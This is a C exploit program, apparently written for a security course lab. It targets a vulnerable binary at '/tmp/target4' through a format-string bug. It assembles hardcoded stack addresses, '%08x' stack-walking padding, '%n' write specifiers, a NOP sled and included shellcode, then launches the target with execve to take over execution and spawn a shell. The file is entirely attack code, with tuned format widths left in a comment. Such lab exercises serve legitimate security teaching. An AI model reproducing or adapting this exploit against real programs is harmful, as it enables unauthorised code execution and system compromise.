#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

char lift[] = "%08x\x00";
char dummy[] = "\x31\x31\x31\x31\x04\xfe\xff\xbf"
               "\x31\x31\x31\x31\x05\xfe\xff\xbf"
               "\x31\x31\x31\x31\x06\xfe\xff\xbf"
               "\x31\x31\x31\x31\x07\xfe\xff\xbf\x00";
//char real[] = "%84u%n%112u%n%259u%n%192u%n\x00";
char real[] = "%11u%n%11u%n%11u%n%11u%n\x00";

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  char sp[1000];
  memset(sp, 0x90, sizeof(sp));
  int i;
  char *write = sp;
  int lift_size = 3;
  int written = 0;

  // ebp: 0xbffffe68
  memcpy(write, dummy, strlen(dummy));
  write += strlen(dummy);
  for(i = 0; i < lift_size; i++) {
      memcpy(write, lift, strlen(lift));
      write += strlen(lift);
  }
  memcpy(write, real, strlen(real));
  write += strlen(real);
  memcpy(write, shellcode, strlen(shellcode));
  write += strlen(shellcode);
  write[0] = '\x00';

  args[1] = sp;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
